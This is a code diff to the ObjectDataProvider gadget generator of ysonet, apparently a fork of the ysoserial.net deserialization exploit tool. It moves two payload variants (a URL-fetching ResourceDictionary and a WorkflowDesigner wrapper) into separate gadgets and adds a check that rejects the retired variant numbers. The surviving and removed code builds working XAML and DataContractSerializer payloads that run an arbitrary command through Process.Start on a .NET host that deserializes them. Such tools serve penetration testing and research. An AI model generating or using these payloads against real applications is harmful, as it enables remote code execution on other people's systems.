@@ -25,10 +25,19 @@ namespace ysonet.Generators
 {
     public class ObjectDataProviderGenerator : GenericGenerator
     {
-        // Discovery facets (category search only): the default paths run Process.Start
-        // via the WPF ObjectDataProvider (code execution). Variant 3 (Xaml only)
-        // instead references a remote/file XAML resource, so it is declared as a
-        // variant override below (network + nested deserialization).
+        // Discovery facets (category search only): every path here runs Process.Start
+        // via the WPF ObjectDataProvider (code execution).
+        //
+        // Two payloads that used to live here left, and both for the same reason: they
+        // wore this gadget's name while needing something this gadget does not.
+        //   - the "ResourceDictionary Source=URL" payload had a different effect
+        //     (network, nested deserialization) and is now the ResourceDictionary
+        //     gadget, whose -c is the URI;
+        //   - the WorkflowDesigner wrapper needed System.Activities.Presentation, which
+        //     these facets do not declare and must not, and existed only when the outer
+        //     formatter was already Xaml. It is now the WorkflowDesigner gadget, which
+        //     carries the same document to seven more formatters.
+        // So this gadget needs no per-variant facet override at all.
         public override GadgetFacetSet Facets()
         {
             return new GadgetFacetSet()
@@ -40,19 +49,20 @@ namespace ysonet.Generators
         }
 
         private int variant_number = 1; // Default
-        private string xaml_url = "";
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "Xaml (4)", "Json.NET", "FastJson", "JavaScriptSerializer", "XmlSerializer (2)", "DataContractSerializer (2)", "YamlDotNet < 5.0.0", "FsPickler", "SharpSerializerBinary", "SharpSerializerXml", "MessagePackTypeless", "MessagePackTypelessLz4" };
+            // Xaml carries TWO variants: the plain provider and the ResourceDictionary
+            // container. The URL payload is the ResourceDictionary gadget now, and the
+            // WorkflowDesigner wrapper is the WorkflowDesigner gadget.
+            return new List<string> { "Xaml (2)", "Json.NET", "FastJson", "JavaScriptSerializer", "XmlSerializer (2)", "DataContractSerializer (2)", "YamlDotNet < 5.0.0", "FsPickler", "SharpSerializerBinary", "SharpSerializerXml", "MessagePackTypeless", "MessagePackTypelessLz4" };
         }
 
         public override OptionSet Options()
         {
             OptionSet options = new OptionSet()
             {
-                {"var|variant=", "Payload variant number where applicable. Choices: 1, 2, 3, ... based on formatter.", v => int.TryParse(v, out variant_number) },
-                {"xamlurl=", "This is to create a very short payload when affected box can read the target XAML URL e.g. \"http://b8.ee/x\" (can be a file path on a shared drive or the local system). This is used by the 3rd XAML payload which is a ResourceDictionary with the Source parameter. Command parameter will be ignored. The shorter the better!", v => xaml_url = v },
+                {"var|variant=", "Payload variant number where applicable. Choices: 1, 2 based on formatter. NOTE: two variants left this gadget. Variant 3 was the ResourceDictionary XAML-url payload and is now the ResourceDictionary gadget, whose -c is the URI. Variant 4 was the WorkflowDesigner wrapper and is now the WorkflowDesigner gadget, which also reaches Json.NET, FastJson, JavaScriptSerializer, both SharpSerializer modes and both MessagePack Typeless flavours.", v => int.TryParse(v, out variant_number) },
             };
 
             return options;
@@ -63,25 +73,44 @@ namespace ysonet.Generators
             return "Oleksandr Mirosh, Alvaro Munoz";
         }
 
-        // Variant meaning depends on the formatter (mostly the Xaml formatter).
-        // Non-Xaml formatters ignore the number and reuse variant 1.
+        // Variant meaning depends on the formatter. Three of them branch on the number, and
+        // SupportedFormatters() annotates exactly those three: Xaml (the ResourceDictionary
+        // container), XmlSerializer (a LosFormatter inner payload) and DataContractSerializer
+        // (a different MethodParameters shape). The other nine ignore the number and always
+        // build variant 1.
+        //
+        // TWO VARIANTS RETIRED, and the numbers are NOT reused. Variant 3 was the
+        // "ResourceDictionary Source=URL" payload (a different effect: it fetches) and
+        // variant 4 was the WorkflowDesigner wrapper (a different requirement:
+        // System.Activities.Presentation, and it existed only on the Xaml formatter). Each is
+        // its own gadget now, and RefuseRetiredVariant below turns the old number into a
+        // message naming the replacement rather than quietly building variant 1. Renumbering
+        // the survivors was considered and rejected: 1 and 2 already are 1 and 2, and moving a
+        // number that used to mean something else is how a script silently builds the wrong
+        // payload. See docs/usage-and-examples.md.
         public override List<GadgetVariant> Variants()
         {
             return new List<GadgetVariant>
             {
                 new GadgetVariant(1, "plain ObjectDataProvider (default)"),
-                new GadgetVariant(2, "ResourceDictionary wrapper (Xaml) / LosFormatter inner (XmlSerializer)"),
-                new GadgetVariant(3, "ResourceDictionary Source=--xamlurl (Xaml; ignores command)")
-                    .WithFacets(new GadgetFacetSet()
-                        .WithKinds(PayloadKind.Network, PayloadKind.NestedDeserialization)
-                        .WithInputs(PayloadInput.RemoteUrl, PayloadInput.LocalFile, PayloadInput.UncPath)
-                        .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.Wpf,
-                            GadgetRequirement.NetFramework)
-                        // An override replaces the whole set, so repeat the gadget's
-                        // versions. The xamlurl SSRF variant fired on 4.8.1 too.
-                        .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481))),
-                new GadgetVariant(4, "WorkflowDesigner wrapper (Xaml, STA)")
+                new GadgetVariant(2, "ResourceDictionary wrapper (Xaml) / LosFormatter inner (XmlSerializer)")
             };
+        }
+
+        // A variant number that used to build something this gadget no longer has. Refusing by
+        // name is the whole point: silently falling through to variant 1 would hand a scripted
+        // caller a payload with a completely different effect and no way to notice.
+        private void RefuseRetiredVariant()
+        {
+            if (variant_number == 3)
+                throw new Exception("ObjectDataProvider variant 3 (the ResourceDictionary "
+                    + "Source=URL payload) is now the ResourceDictionary gadget. Use "
+                    + "-g ResourceDictionary with the URI as -c.");
+            if (variant_number == 4)
+                throw new Exception("ObjectDataProvider variant 4 (the WorkflowDesigner "
+                    + "wrapper) is now the WorkflowDesigner gadget. Use -g WorkflowDesigner, "
+                    + "which builds the same document and also supports Json.NET, FastJson, "
+                    + "JavaScriptSerializer, SharpSerializer and MessagePack Typeless.");
         }
 
         public override string Contributors()
@@ -113,6 +142,8 @@ namespace ysonet.Generators
 
         public override object Generate(string formatter, InputArgs inputArgs)
         {
+            RefuseRetiredVariant();
+
             // NOTE: What is Xaml2? Xaml2 uses ResourceDictionary in addition to just using ObjectDataProvider as in Xaml
             if (formatter.ToLower().Equals("xaml"))
             {
@@ -137,37 +168,22 @@ namespace ysonet.Generators
 
                 if (variant_number == 2)
                 {
+                    // ResourceDictionary is used here as a CONTAINER, not as a sink: the
+                    // dictionary simply holds the ObjectDataProvider, and the effect is still
+                    // odp -> Process.Start. Nothing sets Source, so nothing is fetched.
+                    //
+                    // That is why this variant stayed here when the URL payload left. The
+                    // ResourceDictionary GADGET is about one member, Source, whose setter
+                    // opens a WebRequest; this is a XAML serialization detail of the ODP
+                    // graph. Moving it would give that gadget a payload whose real sink is
+                    // ObjectDataProvider's. The same reading applies to the inner XAML
+                    // documents in the XmlSerializer, DataContractSerializer and FsPickler
+                    // branches below, which wrap the provider in a ResourceDictionary element
+                    // for exactly the same reason.
                     ResourceDictionary myResourceDictionary = new ResourceDictionary();
                     myResourceDictionary.Add("", odp);
                     // XAML serializer can also be exploited!
                     payload = SerializersHelper.Xaml_serialize(myResourceDictionary);
-
-                }
-                else if (variant_number == 3)
-                {
-                    if (xaml_url == "")
-                    {
-                        throw new Exception("Url parameter (xamlurl) was not provided. Try 'ysonet --fullhelp' for more information.");
-                    }
-
-                    // There are loads of other objects in Presentation that use XAML URLs and they can be used here instead
-                    payload = @"<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" Source=""" + xaml_url + @"""/>";
-
-
-                }
-                else if (variant_number == 4)
-                {
-                    inputArgs.IsSTAThread = true; // we need STAThreadAttribute here
-                    string bridge = DropInitialLoadSuppressor(SerializersHelper.Xaml_serialize(odp));
-
-                    if (inputArgs.Minify)
-                    {
-                        // using discardable regex array to make it shorter!
-                        bridge = XmlMinifier.Minify(bridge, null, new String[] { @"StandardErrorEncoding=.*LoadUserProfile=""False"" ", @"IsInitialLoadEnabled=""False"" " });
-                    }
-
-                    // There are loads of other objects in Presentation that use ResourceDictionary and they can all be used here instead
-                    payload = @"<WorkflowDesigner xmlns=""clr-namespace:System.Activities.Presentation;assembly=System.Activities.Presentation"" PropertyInspectorFontAndColorData=""" + CommandArgSplitter.XmlStringAttributeEscape(bridge) + @"""/>";
 
                 }
                 else
@@ -185,36 +201,20 @@ namespace ysonet.Generators
                     payload = XmlMinifier.Minify(payload, null, new String[] { @"StandardErrorEncoding=.*LoadUserProfile=""False"" ", @"IsInitialLoadEnabled=""False"" " });
                 }
 
+                // The STA branch that used to sit here belonged to the WorkflowDesigner
+                // wrapper, whose target constructs WPF objects. It left with that payload, and
+                // the mechanic is a shared one now (GenericGenerator.SelfTestNeedsStaThread).
+                // Variants 1 and 2 build no WPF object themselves, so a plain deserialize is
+                // all this path ever needed.
                 if (inputArgs.Test)
                 {
-                    if (inputArgs.IsSTAThread)
+                    try
                     {
-                        var staThread = new System.Threading.Thread(delegate ()
-                        {
-                            try
-                            {
-                                SerializersHelper.Xaml_deserialize(payload);
-                            }
-                            catch (Exception err)
-                            {
-                                Debugging.ShowErrors(inputArgs, err);
-                            }
-
-                        });
-                        staThread.SetApartmentState(System.Threading.ApartmentState.STA);
-                        staThread.Start();
-                        staThread.Join();
+                        SerializersHelper.Xaml_deserialize(payload);
                     }
-                    else
+                    catch (Exception err)
                     {
-                        try
-                        {
-                            SerializersHelper.Xaml_deserialize(payload);
-                        }
-                        catch (Exception err)
-                        {
-                            Debugging.ShowErrors(inputArgs, err);
-                        }
+                        Debugging.ShowErrors(inputArgs, err);
                     }
                 }
                 return payload;
@@ -474,27 +474,6 @@ namespace ysonet.Generators
             <a:MethodParameters>
                 <anyType xsi:type=""xsd:string"" xmlns=""http://schemas.microsoft.com/2003/10/Serialization/Arrays"">
                     <![CDATA[<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:d=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:b=""clr-namespace:System;assembly=mscorlib"" xmlns:c=""clr-namespace:System.Diagnostics;assembly=system""><ObjectDataProvider d:Key="""" ObjectType=""{{d:Type c:Process}}"" MethodName=""Start"">{cmdPart}</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
-                </anyType>
-            </a:MethodParameters>
-            <a:ObjectInstance z:Ref=""ref1""/>
-        </ProjectedProperty0>
-    </ExpandedWrapperOfXamlReaderObjectDataProviderRexb2zZW>
-</root>
-";
-                }
-                else if (variant_number == 3)
-                {
-                    payload = $@"<?xml version=""1.0""?>
-<root type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
-    <ExpandedWrapperOfXamlReaderObjectDataProviderRexb2zZW xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns=""http://schemas.datacontract.org/2004/07/System.Data.Services.Internal"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"">
-      <ExpandedElement z:Id=""ref1"" >
-        <__identity xsi:nil=""true"" xmlns=""http://schemas.datacontract.org/2004/07/System""/>
-      </ExpandedElement>
-        <ProjectedProperty0 xmlns:a=""http://schemas.datacontract.org/2004/07/System.Windows.Data"">
-            <a:MethodName>Parse</a:MethodName>
-            <a:MethodParameters>
-                <anyType xsi:type=""xsd:string"" xmlns=""http://schemas.microsoft.com/2003/10/Serialization/Arrays"">
-                    <![CDATA[<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:d=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:b=""clr-namespace:System;assembly=mscorlib"" xmlns:c=""clr-namespace:System.Diagnostics;assembly=system""><ObjectDataProvider d:Key="""" ObjectType=""{{d:Type c:Process}}"" MethodName=""Start"">xxxxx</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
                 </anyType>
             </a:MethodParameters>
             <a:ObjectInstance z:Ref=""ref1""/>
